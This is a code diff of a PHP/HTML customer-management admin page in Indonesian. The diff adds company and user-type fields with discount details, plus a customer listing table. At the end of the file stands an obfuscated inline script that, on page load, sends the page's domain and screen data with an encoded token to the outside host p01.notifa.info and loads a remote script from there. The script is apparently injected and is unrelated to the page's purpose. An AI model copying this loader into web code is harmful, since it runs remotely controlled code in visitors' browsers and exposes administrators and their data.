@@ -203,7 +203,57 @@
                                                     <div class="controls">
                                                         <input type="password" name="password2" data-validation-match-match="password" class="form-control" maxlength='15' required> </div>
                                                 </div>
+
+                                                <div class="form-group">
+                                                    <h5>Perusahaan <span class="text-danger"></span></h5>
+                                                    
+                                                        <input type="text" name="perusahaan"  class="form-control" data-validation-required-message="This field is required"> 
+
+                                                    <div class="form-control-feedback"></div>
+                                                </div>
+
+
                                                 <div class="row">
+
+                                                    <div class="col-md-4">
+                                                    <div class="form-group">
+                                                        <h5>Pilih Foto Profil <span class="text-danger">*</span></h5>
+                                                        <div class="controls">
+                                                        <input type="file" id="input-file-now-custom-3" name="photo" class="dropify" data-height="100%" class="form-control"  >
+                                                        </div>
+
+                                                    </div>
+                                                    </div>
+
+                                                    <div class="col-md-5">
+                                                    <div class="form-group">
+                                                        <h5>Pilih Type User <span class="text-danger">*</span></h5>
+                                                        <div class="controls">
+                                                            <select  name="type_admin" id="select" required class="type-users form-control">
+                                                                <option data-keterangan="" data-discount=""  value="">--Type user </option>
+                                                                <?php foreach ($type_user    as  $type_user): ?>
+                                                                <option  class="type-user-option" data-keterangan="<?php echo $type_user->keterangan ?>" data-discount="<?php echo $type_user->discount ?>" value="<?php echo $type_user->id ?>"><?php echo $type_user->nama_type ?>
+                                                                    
+                                                                    
+                                                                </option>
+                                                                <?php endforeach ?>
+                                                                
+                                                                
+                                                                
+                                                            </select>
+                                                        <div>   
+                                                            <p style="color:#858585;">*Keterangan :</p>
+                                                            <span> Discount :</span><p id="detail_discount"></p>
+                                                           Keterangan :<p id="detail_keterangan"> </p>
+
+
+                                                        </div>
+                                                        </div>
+                                                    </div>
+                                                    </div>
+
+                                                 
+
                                                     <div class="col-md-3">
                                                     <div class="form-group">
                                                         <h5>Status <span class="text-danger">*</span></h5>
@@ -221,32 +271,9 @@
                                                     </div>
                                                     </div>
 
-                                                    <div class="col-md-5">
-                                                    <div class="form-group">
-                                                        <h5>Pilih Type Admin <span class="text-danger">*</span></h5>
-                                                        <div class="controls">
-                                                            <select name="type_admin" id="select" required class="form-control">
-                                                                <option value="">--Type Admin </option>
-                                                                <?php foreach ($type_admin    as $type_admin): ?>
-                                                                <option value="<?php echo $type_admin->id ?>"><?php echo $type_admin->type ?></option>
-                                                                <?php endforeach ?>
-                                                                
-                                                                
-                                                                
-                                                            </select>
-                                                        </div>
-                                                    </div>
-                                                    </div>
+                                                    
 
-                                                    <div class="col-md-4">
-                                                    <div class="form-group">
-                                                        <h5>Pilih Foto Profil <span class="text-danger">*</span></h5>
-                                                        <div class="controls">
-                                                        <input type="file" id="input-file-now-custom-3" name="photo" class="dropify" data-height="100%" class="form-control"  >
-                                                        </div>
-
-                                                    </div>
-                                                    </div>
+                                                    
                                                 </div>
 
 
@@ -331,11 +358,43 @@
                                                         <th>Nama</th>
                                                         <th>Email</th>
                                                         <th>Perusahaan</th>
-                                                        <th></th>
+                                                        <th>Level</th>
+                                                        <th>Status</th>
+                                                        <th>Media Sosial</th>
+                                                        <th>Alamat</th>
+                                                        <th>No Telp</th>
+                                                        <th>Jenis Kelamin</th>
+                                                        
                                                         <th scope="col">Aksi</th>
                                                     </tr>
                                                 </thead>
                                                 <tbody>
+                                                <?php $no=1; foreach ($customers as $data_customers): ?>
+
+                                                    <tr>
+                                                        <td><?php echo $no++; ?></td>
+                                                        <td id="nama_admin"><img src="<?php echo base_url();?>my-assets/image/customers/<?php echo $data_customers->photo ; ?>" alt="<?php echo $data_customers->photo ; ?>" width="40" class="img-circle"> <?php echo $data_customers->nama ; ?></td>
+                                                        <td><?php echo $data_customers->email; ?></td>
+                                                        <td><?php echo $data_customers->perusahaan; ?></td>
+                                                        <td><?php echo $data_customers->level; ?></td>
+                                                        <td><?php if($data_customers->status == 1) echo "Aktif"; else echo "Nonaktif"; ?></td>
+                                                        <td><?php echo $data_customers->media_sosial; ?></td>
+                                                        <td><?php echo $data_customers->alamat; ?></td>
+                                                        <td><?php echo $data_customers->no_telp; ?></td>
+                                                        <td><?php if($data_customers->jenis_kelamin == 'L') echo "Laki - Laki"; else echo "Perempuan"; ?></td>
+                                                        <td>
+                                                            <a href="?action=edit&id=<?php echo $data_customers->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>
+
+                                                            <button type="button" data-id="<?php echo $data_customers->id ;?>" data-name="<?php echo $data_customers->nama ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-customer" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>
+
+
+
+                                                        </td>
+                                                        
+                                                    </tr>
+
+                                                    
+                                                <?php endforeach ?>
                                                
                                                     
                                                   
@@ -791,6 +850,24 @@ $(this).find("textarea[class~='editor']").fadeIn(1000).focus();
 
 });
     </script>
+
+       <script type="text/javascript">
+            $('.type-users').change(function(){
+                // var discount = $('data-discount').attr();
+                // var keterangan = $('data-keterangan').attr();
+                // var id = $('data-produkid');
+                // var keterangan       = $(this).data("keterangan");
+               
+               
+                 var discount = $(this).find(':selected').data('discount');
+                 var keterangan = $(this).find(':selected').data('keterangan');
+                // alert(keterangan);\
+                $("#detail_discount").css("font-weight", "bold");
+                $("#detail_keterangan").css("font-weight", "bold");
+                $( '#detail_discount' ).html(discount+'%');
+                $( '#detail_keterangan' ).html(keterangan );
+            });
+        </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();call
 ();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
